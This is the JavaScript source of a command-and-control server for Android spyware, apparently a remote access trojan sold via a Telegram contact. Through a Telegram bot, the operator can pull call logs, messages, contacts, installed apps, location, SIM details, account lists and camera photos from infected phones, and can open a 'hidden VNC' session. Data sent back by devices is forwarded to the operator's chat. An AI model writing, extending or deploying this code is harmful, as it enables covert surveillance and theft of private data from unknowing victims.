import express from 'express';
import cors from 'cors';
import ejs from "ejs";
import fs from "fs";
import json from "./index.json" with {type: 'json'};
import TelegramBot from "node-telegram-bot-api";

const token = ""; //机器人代币
const chatId = ""; //聊天 ID
const host = ""; 
const PORT = 3000;


const bot = new TelegramBot(token, {
    polling: true
});
const app = express();
app.use(cors());
app.use(express.json({
    limit: '1gb'
}));
app.use(express.urlencoded({
    limit: '1gb',
    extended: true
}));
app.set("view engine", "ejs");
app.use(express.static("assets"));



var keyboard = [
    ["🚀 打开扩展控制面板"],
    ["💻 隐藏VNC"],
    ["📃 获取通话记录", "📩 获取所有消息"],
    ["👥 获取联系人", "📱 获取所有应用"],
    ["📍 获取位置信息", "📶 获取SIM卡信息"],
    ["📸 前置摄像头", "📸 后置摄像头"],
    ["👤 获取账号列表", "🖥️ 获取系统信息"]
];



var devices = JSON.parse(JSON.stringify(json));


bot.on("polling_error", (e) => {
    console.log(e)
})


bot.on("message", (msg) => {

    var id = msg.chat.id;
    var text = msg.text || "";
    if (chatId != id) return bot.sendMessage(id, "✨ 联系 @WuzenHQ");
    var thId = msg.message_thread_id;
    var deviceId;
    for (var thread in json) {
        if (json[thread].threadId == thId) {
            deviceId = thread;
        }
    }
    if (!deviceId) return;
    if (text == "🚀 打开扩展控制面板") {
        bot.sendMessage(chatId, "❇️ 扩展控制面板 \n\n请点击下面的按钮打开。", {
            reply_markup: {
                inline_keyboard: [
                    [{
                        "text": "🚀 打开扩展控制面板",
                        url: `http://${host}:${PORT}?id=${deviceId}`
                    }]
                ]
            },
            message_thread_id: msg.message_thread_id
        })
    } else if (text == "💻 隐藏VNC") {
        bot.sendMessage(chatId, "🖥️ 隐藏的 VNC \n\n请点击下面的按钮打开。", {
            reply_markup: {
                inline_keyboard: [
                    [{
                        "text": "💻 隐藏VNC",
                        url: `http://${host}:${PORT}?id=${deviceId}`
                    }]
                ]
            },
            message_thread_id: msg.message_thread_id
        })
    } else if (text == "📃 获取通话记录") {
        sendCommand(msg.message_thread_id, "📃 获取通话记录");
    } else if (text == "📩 获取所有消息") {
        sendCommand(msg.message_thread_id, "📩 获取所有消息");
    } else if (text == "👥 获取联系人") {
        sendCommand(msg.message_thread_id, "👥 获取联系人");
    } else if (text == "📱 获取所有应用") {
        sendCommand(msg.message_thread_id, "📱 获取所有应用");
    } else if (text == "📍 获取位置信息") {
        sendCommand(msg.message_thread_id, "📍 获取位置信息");
    } else if (text == "📶 获取SIM卡信息") {
        sendCommand(msg.message_thread_id, "📶 获取SIM卡信息");
    } else if (text == "📸 前置摄像头") {
        sendCommand(msg.message_thread_id, "📸 前置摄像头");
    } else if (text == "📸 后置摄像头") {
        sendCommand(msg.message_thread_id, "📸 后置摄像头");
    } else if (text == "👤 获取账号列表") {
        sendCommand(msg.message_thread_id, "👤 获取账号列表");
    } else if (text == "🖥️ 获取系统信息") {
        sendCommand(msg.message_thread_id, "🖥️ 获取系统信息");
    } else {
        sendCommand(msg.message_thread_id, "⚠️ 未识别命令");
    }
});


function sendCommand(id, command) {
    for (var threadId in json) {
        if (json[threadId].threadId == id) {
            var id = threadId;
            if ("res" in devices[id]) {
                devices[id].res.json({
                    call: command
                });
                clearTimeout(devices[id].timeout);
                delete devices[id].res;
                delete devices[id].timeout;
            } else {
                json[threadId].command = command;
                fs.writeFile('index.json', JSON.stringify(json, null, 2), 'utf8', (err) => {
                    if (err) console.error(err);
                });
            }
        }
    }
}




app.get("/", (req, res) => {
    const id = req.query.id;
    var data = {
        status: devices[id] ? true : false,
        ...json[id]
    }
    res.render("index", data);
})



app.get('/call', (req, res) => {

    var id = req.query.id;
    if (!id) {
        return res.json({});
    }
    if (json[id]?.command) {
        res.json({
            call: json[id]?.command
        });
        delete json[id].command;
        fs.writeFile('index.json', JSON.stringify(json, null, 2), 'utf8', (err) => {
            if (err) console.error(err);
        });
        return;
    }
    const timeout = setTimeout(() => {
        res.json({});
        devices[id] = {};
    }, 30000);
    (devices[id] ??= {}).timeout = timeout;
    (devices[id] ??= {}).res = res;
});




app.post('/call', async (req, res) => {
    var info = req.body;
    var type = info.type;
    var id = info.id;
    if (type == "a" || type == "ac") {
        if (type == "ac") {
            await createTopics(id, info, req.ip.replace("::ffff:", ""));
        }
        var inf = `<b>🟢 设备在线</b>

🏷️ 品牌: ${info.brand}
🔧 型号: ${info.model}
🏭 制造商: ${info.manufacturer}
🔩 设备: ${info.device}
📦 产品: ${info.product}
⚙️ SDK版本: ${info.sdk_int} | 操作系统: Android ${info.os_version}
🔋 电量: ${info.battery}%电池
🌍 国家/地区: ${info.country}
🪪 Android ID: ${info.android_id}
🈯 语言: ${info.language.toUpperCase()}
🌐 IP地址: ${req.ip}
🕒 时区: ${info.timezone}`;
        bot.sendMessage(chatId, inf, {
            parse_mode: "HTML",
            message_thread_id: devices[id].threadId,
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true,
                one_time_keyboard: false
            }
        });
    } else if (type == "t") {
        var text = info.data;
        const MAX_LENGTH = 4096;
        const parts = [];
        for (let i = 0; i < text.length; i += MAX_LENGTH) {
            parts.push(text.substring(i, i + MAX_LENGTH));
        }
        parts.forEach((part, index) => {
            setTimeout(() => {
                bot.sendMessage(chatId, part, {
                    parse_mode: "HTML",
                    message_thread_id: json[id].threadId,
                    reply_markup: {
                        keyboard: keyboard,
                        resize_keyboard: true,
                        one_time_keyboard: false
                    }
                });
            }, index * 500);
        });

    } else if (type == "l") {
        var lat = info.lat;
        var lon = info.lon;
        bot.sendLocation(chatId, lat, lon, {
            parse_mode: "HTML",
            message_thread_id: devices[id].threadId,
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true,
                one_time_keyboard: false
            }
        });

        bot.sendMessage(chatId, info.data, {
            parse_mode: "HTML",
            message_thread_id: devices[id].threadId,
            reply_markup: {
                keyboard: keyboard,
                resize_keyboard: true,
                one_time_keyboard: false
            }
        })

    } else if (type == "c") {
        const buffer = Buffer.from(info.data, 'base64');
        await bot.sendPhoto(chatId, buffer);
    }
    res.json({
        success: true
    });
});



async function createTopics(id, info, ip) {
    var result = await bot.createForumTopic(chatId, info.brand + " " + info.model);
    (devices[id] ??= {}).threadId = result.message_thread_id;
    (json[id] ??= {}).threadId = result.message_thread_id;
    (json[id] ??= {}).device = info.brand + " " + info.model;
    (json[id] ??= {}).battery = info.battery;
    (json[id] ??= {}).os_version = info.os_version;
    (json[id] ??= {}).issued = new Date().getTime();
    (json[id] ??= {}).country = info.country;
    (json[id] ??= {}).ip = ip;
    fs.writeFile('index.json', JSON.stringify(json, null, 2), (err) => {
        if (err) console.error(err);
    });
    return "";
}




app.post('/send', (req, res) => {
    const {
        id,
        message
    } = req.body;
    if (!message || !id) return res.status(400).json({});
    var deviceId;
    for (var thread in json) {
        if (thread == id) {
            deviceId = thread;
        }
    }
    if (!deviceId) return res.json({});
    if (devices[id].res) {

        devices[id].res.json({
            call: message
        });
        clearTimeout(devices[id].timeout);
        delete devices[id].res;
        delete devices[id].timeout;

    } else {

        json[id].command = message;
        fs.writeFile('index.json', JSON.stringify(json, null, 2), 'utf8', (err) => {
            if (err) console.error(err);
        });

    }
    res.json({});
});




app.post("/vnc", (req, res) => {
    if (devices[req.query.id]) devices[req.query.id].vnc = req.body;
    res.json({});
});




app.get('/vnc', (req, res) => {

    const id = req.query.id;

    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');

    res.setHeader('Access-Control-Allow-Origin', '*');


    const interval = setInterval(() => {
        res.write(`data: ${JSON.stringify(devices[id]?.vnc || {})}\n\n`);
    }, 200);


    req.on('close', () => {
        clearInterval(interval);
    });
});




app.listen(PORT, () => {
    console.log(`服务器正在运行 http://${host}:${PORT}`);
});